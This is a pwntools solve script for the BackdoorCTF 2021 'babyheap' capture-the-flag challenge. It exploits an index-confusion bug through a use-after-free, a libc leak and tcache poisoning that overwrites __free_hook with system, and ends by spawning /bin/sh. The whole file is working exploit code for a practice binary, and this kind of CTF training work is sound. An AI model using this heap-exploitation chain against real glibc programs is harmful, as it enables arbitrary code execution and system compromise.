#!/usr/bin/env python3
"""BackdoorCTF 2021 - babyheap solve script
Vulnerability: Index confusion (chunk_index_a vs chunk_index_b mismatch)
Technique: Index overflow -> UAF -> libc leak -> tcache poisoning -> free_hook overwrite
"""
from pwn import *

context.arch = 'amd64'
exe = context.binary = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2")

def start():
    return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def malloc(size, idx):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Index: ", str(idx).encode())

def free():
    io.sendlineafter(b">> ", b"3")

def view(idx):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, size, data):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", data)

io = start()

# Exploit index confusion
malloc(4, 1)
malloc(2, 3)
malloc(4294967293, 10)  # Overflow chunk_index_a

free()
free()
free()

# Leak libc
view(3)
io.recvline()
leak = io.recvline(keepends=False)
leak = u64(leak + b"\0\0")
libc.address = leak - 0x1ebbe0
log.info(f"libc base: {hex(libc.address)}")

# Tcache poisoning to free_hook
edit(4, 9, p64(libc.sym.__free_hook))

malloc(3, 3)
edit(4, 9, p64(libc.sym.system))

malloc(1, 3)
edit(6, 8, b"/bin/sh")

free()
io.interactive()
